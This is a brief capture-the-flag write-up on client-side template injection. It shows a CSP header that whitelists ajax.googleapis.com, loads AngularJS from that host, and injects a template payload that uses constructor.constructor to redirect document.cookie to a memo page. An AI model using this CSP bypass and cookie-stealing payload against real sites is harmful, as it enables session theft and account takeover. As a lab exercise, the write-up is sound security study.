# Client Side Template Injection
This challenge involves including a library from csp whitelist and csti

CSP Header:
```
Content-Security-Policy: default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'nonce-bfce09f662db9b533ce890e50c7d59a1' 'unsafe-eval' https://ajax.googleapis.com; object-src 'none'
```

## Solve
Since script-src allow `https://ajax.googleapis.com` and this is a csti challenge, i include angularJS from google apis and do csti:

To include angularjs:
```
http://chall.site?param=<html><script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script></html>
```

CSTI:
```
?param=<html ng-app><script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>{{constructor.constructor('location.href="/memo?memo="+document.cookie')()}}</html>
```
